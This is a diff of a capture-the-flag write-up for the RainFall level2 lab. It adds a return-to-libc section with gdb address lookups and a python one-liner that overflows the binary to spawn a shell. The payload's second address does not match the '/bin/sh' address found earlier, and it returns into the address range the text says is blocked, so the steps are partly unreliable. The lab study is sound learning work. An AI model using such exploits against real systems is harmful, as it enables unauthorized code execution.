@@ -61,6 +61,30 @@ void p(void)
   return;
 }
 ~~~
-We can already see that the program is **allocating 80 bytes, 76 for the string and 4 bytes for uint variable (4 bytes on 32 bit systems)**. From what we already know about **stack frame** for program execution, this will be our potential offset for force execution of what we might need on the place of the return memory address. **BUT!** this code is little wittier, as the return address comparation here is effectivelly blocking the classical buffer overflow. Why? Read the stuff [HERE](https://unix.stackexchange.com/questions/509607/how-a-64-bit-process-virtual-address-space-is-divided-in-linux). As we can see, 0xbf****** address ranges are historically associated with user memory on 32 bit x86 systems - the stack, in other words. So, the code above is blocking the execution of the return memory addresses located on the stack, exiting the flow. Fortunatelly, there is also a **heap**...
+We can already see that the program is **allocating 80 bytes, 76 for the string and 4 bytes for uint variable (4 bytes on 32 bit systems)**. From what we already know about **stack frame** for program execution, this will be our potential offset for force execution of what we might need on the place of the return memory address. **BUT!** this code is little wittier, as the return address comparation here is effectivelly blocking the classical buffer overflow. Why? Read the stuff [HERE](https://unix.stackexchange.com/questions/509607/how-a-64-bit-process-virtual-address-space-is-divided-in-linux). As we can see, 0xbf****** address ranges are historically associated with user memory on 32 bit x86 systems - the stack, in other words. So, the code above is blocking the execution of the return memory addresses located on the stack, exiting the flow when it finds such. Fortunatelly, there is also a **heap**...
+
+## Return to libc
+We will use the [**return to libc**](https://en.wikipedia.org/wiki/Return-to-libc_attack) type of attack that is not utiliying the stack but rather works with stuff already in process memory. We construct the attack using this flow
+~~~
+overflow on offset -> mem address of system() -> mem address of "/bin/sh"
+~~~
+Using gdb's brakepoint, we will find what we need:
+~~~bash
+(gdb) b p
+Breakpoint 1 at 0x80484da
+(gdb) r
+Starting program: /home/user/level2/level2 
+
+Breakpoint 1, 0x080484da in p ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) find 0xb7e6b060, +9999999, "/bin/sh"
+0xb7f8cc58
+~~~
+Now we use this to construct the attack:
+~~~bash
+level2@RainFall:~$ python -c 'print "F" * 80  + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1]' > /tmp/flag2
+level2@RainFall:~$ cat /tmp/flag2 - | ./level2
+~~~
 
 
